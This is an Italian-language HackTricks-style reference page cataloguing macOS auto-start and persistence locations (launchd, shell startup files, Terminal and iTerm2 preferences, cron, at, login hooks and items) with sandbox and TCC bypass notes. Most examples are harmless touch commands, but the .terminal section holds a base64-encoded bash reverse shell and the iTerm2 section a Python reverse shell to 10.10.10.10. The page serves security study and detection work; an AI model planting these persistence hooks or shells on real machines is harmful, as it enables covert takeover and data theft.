# macOS Auto Start

{{#include ../banners/hacktricks-training.md}}

Questa sezione si basa pesantemente sulla serie di blog [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/), l'obiettivo è aggiungere **più Autostart Locations** (se possibile), indicare **quali tecniche funzionano ancora** al giorno d'oggi con l'ultima versione di macOS (13.4) e specificare i **permessi** necessari.

## Sandbox Bypass

> [!TIP]
> Qui puoi trovare le posizioni di avvio utili per il **sandbox bypass** che ti consente di eseguire semplicemente qualcosa **scrivendolo in un file** e **aspettando** un'**azione** molto **comune**, un **determinato intervallo di tempo** o un'**azione che puoi solitamente eseguire** dall'interno di un sandbox senza necessitare di permessi di root.

### Launchd

- Utile per bypassare il sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **`/Library/LaunchAgents`**
- **Trigger**: Riavvio
- Richiesta di root
- **`/Library/LaunchDaemons`**
- **Trigger**: Riavvio
- Richiesta di root
- **`/System/Library/LaunchAgents`**
- **Trigger**: Riavvio
- Richiesta di root
- **`/System/Library/LaunchDaemons`**
- **Trigger**: Riavvio
- Richiesta di root
- **`~/Library/LaunchAgents`**
- **Trigger**: Riconnessione
- **`~/Library/LaunchDemons`**
- **Trigger**: Riconnessione

> [!TIP]
> Come fatto interessante, **`launchd`** ha un elenco di proprietà incorporato nella sezione Mach-o `__Text.__config` che contiene altri servizi ben noti che launchd deve avviare. Inoltre, questi servizi possono contenere `RequireSuccess`, `RequireRun` e `RebootOnSuccess`, il che significa che devono essere eseguiti e completati con successo.
>
> Ovviamente, non può essere modificato a causa della firma del codice.

#### Description & Exploitation

**`launchd`** è il **primo** **processo** eseguito dal kernel OX S all'avvio e l'ultimo a terminare allo spegnimento. Dovrebbe sempre avere il **PID 1**. Questo processo **leggerà ed eseguirà** le configurazioni indicate nei **plists** **ASEP** in:

- `/Library/LaunchAgents`: Agenti per utente installati dall'amministratore
- `/Library/LaunchDaemons`: Demoni a livello di sistema installati dall'amministratore
- `/System/Library/LaunchAgents`: Agenti per utente forniti da Apple.
- `/System/Library/LaunchDaemons`: Demoni a livello di sistema forniti da Apple.

Quando un utente accede, i plists situati in `/Users/$USER/Library/LaunchAgents` e `/Users/$USER/Library/LaunchDemons` vengono avviati con i **permessi degli utenti connessi**.

La **principale differenza tra agenti e demoni è che gli agenti vengono caricati quando l'utente accede e i demoni vengono caricati all'avvio del sistema** (poiché ci sono servizi come ssh che devono essere eseguiti prima che qualsiasi utente acceda al sistema). Inoltre, gli agenti possono utilizzare l'interfaccia grafica mentre i demoni devono essere eseguiti in background.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
Ci sono casi in cui un **agente deve essere eseguito prima che l'utente effettui il login**, questi sono chiamati **PreLoginAgents**. Ad esempio, questo è utile per fornire tecnologia assistiva al login. Possono essere trovati anche in `/Library/LaunchAgents` (vedi [**qui**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) un esempio).

> [!NOTE]
> Nuovi file di configurazione Daemons o Agents saranno **caricati dopo il prossimo riavvio o utilizzando** `launchctl load <target.plist>` È **anche possibile caricare file .plist senza quell'estensione** con `launchctl -F <file>` (tuttavia quei file plist non verranno caricati automaticamente dopo il riavvio).\
> È anche possibile **scaricare** con `launchctl unload <target.plist>` (il processo indicato da esso verrà terminato),
>
> Per **assicurarti** che non ci sia **niente** (come un override) **che impedisca** a un **Agente** o **Daemon** **di** **eseguire** esegui: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`

Elenca tutti gli agenti e i demoni caricati dall'utente corrente:
```bash
launchctl list
```
> [!WARNING]
> Se un plist è di proprietà di un utente, anche se si trova in una cartella di sistema daemon, il **compito verrà eseguito come utente** e non come root. Questo può prevenire alcuni attacchi di escalation dei privilegi.

#### Maggiori informazioni su launchd

**`launchd`** è il **primo** processo in modalità utente che viene avviato dal **kernel**. L'avvio del processo deve essere **riuscito** e **non può uscire o bloccarsi**. È anche **protetto** contro alcuni **segnali di terminazione**.

Una delle prime cose che `launchd` farebbe è **avviare** tutti i **daemon** come:

- **Daemon di timer** basati sul tempo da eseguire:
- atd (`com.apple.atrun.plist`): Ha un `StartInterval` di 30min
- crond (`com.apple.systemstats.daily.plist`): Ha `StartCalendarInterval` per avviarsi alle 00:15
- **Daemon di rete** come:
- `org.cups.cups-lpd`: Ascolta in TCP (`SockType: stream`) con `SockServiceName: printer`
- SockServiceName deve essere o una porta o un servizio da `/etc/services`
- `com.apple.xscertd.plist`: Ascolta in TCP sulla porta 1640
- **Daemon di percorso** che vengono eseguiti quando un percorso specificato cambia:
- `com.apple.postfix.master`: Controlla il percorso `/etc/postfix/aliases`
- **Daemon di notifiche IOKit**:
- `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Porta Mach:**
- `com.apple.xscertd-helper.plist`: Indica nell'entry `MachServices` il nome `com.apple.xscertd.helper`
- **UserEventAgent:**
- Questo è diverso dal precedente. Fa sì che launchd avvii app in risposta a eventi specifici. Tuttavia, in questo caso, il binario principale coinvolto non è `launchd` ma `/usr/libexec/UserEventAgent`. Carica plugin dalla cartella SIP riservata /System/Library/UserEventPlugins/ dove ogni plugin indica il suo inizializzatore nella chiave `XPCEventModuleInitializer` o, nel caso di plugin più vecchi, nel dizionario `CFPluginFactories` sotto la chiave `FB86416D-6164-2070-726F-70735C216EC0` del suo `Info.plist`.

### file di avvio della shell

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

- Utile per bypassare il sandbox: [✅](https://emojipedia.org/check-mark-button)
- Bypass TCC: [✅](https://emojipedia.org/check-mark-button)
- Ma è necessario trovare un'app con un bypass TCC che esegue una shell che carica questi file

#### Posizioni

- **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
- **Attivatore**: Aprire un terminale con zsh
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
- **Attivatore**: Aprire un terminale con zsh
- Richiesta di root
- **`~/.zlogout`**
- **Attivatore**: Uscire da un terminale con zsh
- **`/etc/zlogout`**
- **Attivatore**: Uscire da un terminale con zsh
- Richiesta di root
- Potenzialmente di più in: **`man zsh`**
- **`~/.bashrc`**
- **Attivatore**: Aprire un terminale con bash
- `/etc/profile` (non ha funzionato)
- `~/.profile` (non ha funzionato)
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
- **Attivatore**: Ci si aspetta che si attivi con xterm, ma **non è installato** e anche dopo l'installazione viene generato questo errore: xterm: `DISPLAY is not set`

#### Descrizione & Sfruttamento

Quando si avvia un ambiente shell come `zsh` o `bash`, **alcuni file di avvio vengono eseguiti**. macOS attualmente utilizza `/bin/zsh` come shell predefinita. Questa shell viene automaticamente accessibile quando viene avviata l'applicazione Terminal o quando un dispositivo viene accesso tramite SSH. Anche se `bash` e `sh` sono presenti in macOS, devono essere invocati esplicitamente per essere utilizzati.

La pagina man di zsh, che possiamo leggere con **`man zsh`**, ha una lunga descrizione dei file di avvio.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### Applicazioni Riaperte

> [!CAUTION]
> Configurare l'indicata sfruttamento e disconnettersi e riconnettersi o anche riavviare non ha funzionato per me per eseguire l'app. (L'app non veniva eseguita, forse deve essere in esecuzione quando vengono eseguite queste azioni)

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)

- Utile per bypassare il sandbox: [✅](https://emojipedia.org/check-mark-button)
- Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Posizione

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
- **Attivatore**: Riavviare le applicazioni riaperte

#### Descrizione & Sfruttamento

Tutte le applicazioni da riaprire si trovano all'interno del plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`

Quindi, per far avviare le applicazioni riaperte dalla tua, devi semplicemente **aggiungere la tua app alla lista**.

L'UUID può essere trovato elencando quella directory o con `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Per controllare le applicazioni che verranno riaperte puoi fare:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
Per **aggiungere un'applicazione a questo elenco** puoi usare:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Preferenze del Terminale

- Utile per bypassare il sandbox: [✅](https://emojipedia.org/check-mark-button)
- Bypass TCC: [✅](https://emojipedia.org/check-mark-button)
- Il Terminale utilizza le autorizzazioni FDA dell'utente che lo utilizza

#### Posizione

- **`~/Library/Preferences/com.apple.Terminal.plist`**
- **Attivazione**: Apri il Terminale

#### Descrizione e Sfruttamento

In **`~/Library/Preferences`** sono memorizzate le preferenze dell'utente nelle Applicazioni. Alcune di queste preferenze possono contenere una configurazione per **eseguire altre applicazioni/script**.

Ad esempio, il Terminale può eseguire un comando all'avvio:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Questa configurazione è riflessa nel file **`~/Library/Preferences/com.apple.Terminal.plist`** in questo modo:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
Quindi, se il plist delle preferenze del terminale nel sistema può essere sovrascritto, la funzionalità **`open`** può essere utilizzata per **aprire il terminale e quel comando verrà eseguito**.

Puoi aggiungere questo dalla cli con:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
### Terminal Scripts / Altre estensioni di file

- Utile per bypassare il sandbox: [✅](https://emojipedia.org/check-mark-button)
- Bypass TCC: [✅](https://emojipedia.org/check-mark-button)
- L'uso del Terminal per avere i permessi FDA dell'utente che lo utilizza

#### Posizione

- **Ovunque**
- **Attivazione**: Apri Terminale

#### Descrizione & Sfruttamento

Se crei uno [**`.terminal`** script](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) e lo apri, l'**applicazione Terminale** verrà automaticamente invocata per eseguire i comandi indicati lì. Se l'app Terminale ha alcuni privilegi speciali (come TCC), il tuo comando verrà eseguito con quei privilegi speciali.

Provalo con:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
Potresti anche usare le estensioni **`.command`**, **`.tool`**, con contenuti di script shell regolari e verranno aperti anche da Terminal.

> [!CAUTION]
> Se il terminale ha **Accesso Completo al Disco**, sarà in grado di completare quell'azione (nota che il comando eseguito sarà visibile in una finestra del terminale).

### Plugin Audio

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

- Utile per bypassare il sandbox: [✅](https://emojipedia.org/check-mark-button)
- Bypass TCC: [🟠](https://emojipedia.org/large-orange-circle)
- Potresti ottenere un accesso TCC extra

#### Posizione

- **`/Library/Audio/Plug-Ins/HAL`**
- Richiesta di root
- **Attivazione**: Riavvia coreaudiod o il computer
- **`/Library/Audio/Plug-ins/Components`**
- Richiesta di root
- **Attivazione**: Riavvia coreaudiod o il computer
- **`~/Library/Audio/Plug-ins/Components`**
- **Attivazione**: Riavvia coreaudiod o il computer
- **`/System/Library/Components`**
- Richiesta di root
- **Attivazione**: Riavvia coreaudiod o il computer

#### Descrizione

Secondo i precedenti writeup è possibile **compilare alcuni plugin audio** e farli caricare.

### Plugin QuickLook

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)

- Utile per bypassare il sandbox: [✅](https://emojipedia.org/check-mark-button)
- Bypass TCC: [🟠](https://emojipedia.org/large-orange-circle)
- Potresti ottenere un accesso TCC extra

#### Posizione

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Descrizione & Sfruttamento

I plugin QuickLook possono essere eseguiti quando **attivi l'anteprima di un file** (premi la barra spaziatrice con il file selezionato in Finder) e un **plugin che supporta quel tipo di file** è installato.

È possibile compilare il proprio plugin QuickLook, posizionarlo in una delle posizioni precedenti per caricarlo e poi andare su un file supportato e premere spazio per attivarlo.

### ~~Login/Logout Hooks~~

> [!CAUTION]
> Questo non ha funzionato per me, né con il LoginHook dell'utente né con il LogoutHook di root

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)

- Utile per bypassare il sandbox: [✅](https://emojipedia.org/check-mark-button)
- Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Posizione

- Devi essere in grado di eseguire qualcosa come `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
- `Lo`cato in `~/Library/Preferences/com.apple.loginwindow.plist`

Sono deprecati ma possono essere usati per eseguire comandi quando un utente accede.
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
Questa impostazione è memorizzata in `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
Per eliminarlo:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
L'utente root è memorizzato in **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Bypass del Sandbox Condizionale

> [!TIP]
> Qui puoi trovare le posizioni di avvio utili per il **bypass del sandbox** che ti consente di eseguire semplicemente qualcosa **scrivendolo in un file** e **aspettandoti condizioni non super comuni** come specifici **programmi installati, azioni di utenti "non comuni"** o ambienti.

### Cron

**Scrittura**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)

- Utile per bypassare il sandbox: [✅](https://emojipedia.org/check-mark-button)
- Tuttavia, devi essere in grado di eseguire il binario `crontab`
- O essere root
- Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Posizione

- **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
- È richiesto root per l'accesso diretto in scrittura. Non è richiesto root se puoi eseguire `crontab <file>`
- **Attivazione**: Dipende dal lavoro cron

#### Descrizione & Sfruttamento

Elenca i lavori cron dell'**utente corrente** con:
```bash
crontab -l
```
Puoi anche vedere tutti i cron job degli utenti in **`/usr/lib/cron/tabs/`** e **`/var/at/tabs/`** (richiede root).

In MacOS si possono trovare diverse cartelle che eseguono script con **certa frequenza** in:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
Lì puoi trovare i normali **cron** **jobs**, i **at** **jobs** (non molto usati) e i **periodic** **jobs** (principalmente utilizzati per pulire i file temporanei). I lavori periodici giornalieri possono essere eseguiti, ad esempio, con: `periodic daily`.

Per aggiungere un **user cronjob programmaticamente** è possibile utilizzare:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)

- Utile per bypassare il sandbox: [✅](https://emojipedia.org/check-mark-button)
- Bypass TCC: [✅](https://emojipedia.org/check-mark-button)
- iTerm2 aveva permessi TCC concessi

#### Locations

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
- **Trigger**: Apri iTerm
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
- **Trigger**: Apri iTerm
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
- **Trigger**: Apri iTerm

#### Description & Exploitation

Gli script memorizzati in **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** verranno eseguiti. Ad esempio:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
o:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
Lo script **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** verrà eseguito anche:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
Le preferenze di iTerm2 situate in **`~/Library/Preferences/com.googlecode.iterm2.plist`** possono **indicare un comando da eseguire** quando il terminale iTerm2 viene aperto.

Questa impostazione può essere configurata nelle impostazioni di iTerm2:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

E il comando è riflesso nelle preferenze:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
Puoi impostare il comando da eseguire con:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
> [!WARNING]
> È altamente probabile che ci siano **altri modi per abusare delle preferenze di iTerm2** per eseguire comandi arbitrari.

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)

- Utile per bypassare il sandbox: [✅](https://emojipedia.org/check-mark-button)
- Ma xbar deve essere installato
- Bypass TCC: [✅](https://emojipedia.org/check-mark-button)
- Richiede permessi di Accessibilità

#### Posizione

- **`~/Library/Application\ Support/xbar/plugins/`**
- **Attivazione**: Una volta che xbar è eseguito

#### Descrizione

Se il popolare programma [**xbar**](https://github.com/matryer/xbar) è installato, è possibile scrivere uno script shell in **`~/Library/Application\ Support/xbar/plugins/`** che verrà eseguito quando xbar viene avviato:
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)

- Utile per bypassare il sandbox: [✅](https://emojipedia.org/check-mark-button)
- Ma Hammerspoon deve essere installato
- Bypass TCC: [✅](https://emojipedia.org/check-mark-button)
- Richiede permessi di Accessibilità

#### Location

- **`~/.hammerspoon/init.lua`**
- **Trigger**: Una volta eseguito hammerspoon

#### Description

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) funge da piattaforma di automazione per **macOS**, sfruttando il **linguaggio di scripting LUA** per le sue operazioni. In particolare, supporta l'integrazione di codice AppleScript completo e l'esecuzione di script shell, migliorando significativamente le sue capacità di scripting.

L'app cerca un singolo file, `~/.hammerspoon/init.lua`, e quando avviata, lo script verrà eseguito.
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

- Utile per bypassare il sandbox: [✅](https://emojipedia.org/check-mark-button)
- Ma BetterTouchTool deve essere installato
- Bypass TCC: [✅](https://emojipedia.org/check-mark-button)
- Richiede permessi di Automazione-Shortcuts e Accessibilità

#### Location

- `~/Library/Application Support/BetterTouchTool/*`

Questo strumento consente di indicare applicazioni o script da eseguire quando vengono premuti alcuni shortcut. Un attaccante potrebbe configurare il proprio **shortcut e azione da eseguire nel database** per far eseguire codice arbitrario (uno shortcut potrebbe essere semplicemente premere un tasto).

### Alfred

- Utile per bypassare il sandbox: [✅](https://emojipedia.org/check-mark-button)
- Ma Alfred deve essere installato
- Bypass TCC: [✅](https://emojipedia.org/check-mark-button)
- Richiede permessi di Automazione, Accessibilità e persino accesso a Disco Completo

#### Location

- `???`

Consente di creare flussi di lavoro che possono eseguire codice quando vengono soddisfatte determinate condizioni. Potenzialmente è possibile per un attaccante creare un file di flusso di lavoro e farlo caricare ad Alfred (è necessario pagare la versione premium per utilizzare i flussi di lavoro).

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)

- Utile per bypassare il sandbox: [✅](https://emojipedia.org/check-mark-button)
- Ma ssh deve essere abilitato e utilizzato
- Bypass TCC: [✅](https://emojipedia.org/check-mark-button)
- L'uso di SSH richiede accesso FDA

#### Location

- **`~/.ssh/rc`**
- **Trigger**: Accesso via ssh
- **`/etc/ssh/sshrc`**
- Richiesta di root
- **Trigger**: Accesso via ssh

> [!CAUTION]
> Per attivare ssh è necessario l'accesso a Disco Completo:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Description & Exploitation

Per impostazione predefinita, a meno che `PermitUserRC no` non sia presente in `/etc/ssh/sshd_config`, quando un utente **accede via SSH** gli script **`/etc/ssh/sshrc`** e **`~/.ssh/rc`** verranno eseguiti.

### **Login Items**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)

- Utile per bypassare il sandbox: [✅](https://emojipedia.org/check-mark-button)
- Ma è necessario eseguire `osascript` con argomenti
- Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
- **Trigger:** Accesso
- Payload di exploit memorizzato chiamando **`osascript`**
- **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
- **Trigger:** Accesso
- Richiesta di root

#### Description

In Preferenze di Sistema -> Utenti e Gruppi -> **Login Items** puoi trovare **elementi da eseguire quando l'utente accede**.\
È possibile elencarli, aggiungere e rimuovere dalla riga di comando:
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
Questi elementi sono memorizzati nel file **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**

Gli **elementi di accesso** possono **anche** essere indicati utilizzando l'API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) che memorizzerà la configurazione in **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**

### ZIP come elemento di accesso

(Controlla la sezione precedente sugli elementi di accesso, questa è un'estensione)

Se memorizzi un file **ZIP** come un **elemento di accesso**, l'**`Utility di archiviazione`** lo aprirà e se lo zip era, ad esempio, memorizzato in **`~/Library`** e conteneva la cartella **`LaunchAgents/file.plist`** con una backdoor, quella cartella verrà creata (non lo è per impostazione predefinita) e il plist verrà aggiunto in modo che la prossima volta che l'utente accede di nuovo, la **backdoor indicata nel plist verrà eseguita**.

Un'altra opzione sarebbe creare i file **`.bash_profile`** e **`.zshenv`** all'interno della HOME dell'utente, quindi se la cartella LaunchAgents esiste già, questa tecnica funzionerebbe comunque.

### At

Scrittura: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)

- Utile per bypassare il sandbox: [✅](https://emojipedia.org/check-mark-button)
- Ma devi **eseguire** **`at`** e deve essere **abilitato**
- Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Posizione

- Necessita di **eseguire** **`at`** e deve essere **abilitato**

#### **Descrizione**

I compiti `at` sono progettati per **programmare compiti una tantum** da eseguire in determinati momenti. A differenza dei cron job, i compiti `at` vengono automaticamente rimossi dopo l'esecuzione. È fondamentale notare che questi compiti sono persistenti attraverso i riavvii del sistema, contrassegnandoli come potenziali preoccupazioni di sicurezza in determinate condizioni.

Per **impostazione predefinita** sono **disabilitati** ma l'utente **root** può **abilitarli** con:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
Questo creerà un file in 1 ora:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
Controlla la coda di lavoro usando `atq:`
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
Sopra possiamo vedere due lavori programmati. Possiamo stampare i dettagli del lavoro usando `at -c JOBNUMBER`
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
> [!WARNING]
> Se i compiti AT non sono abilitati, i compiti creati non verranno eseguiti.

I **file di lavoro** possono essere trovati in `/private/var/at/jobs/`
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
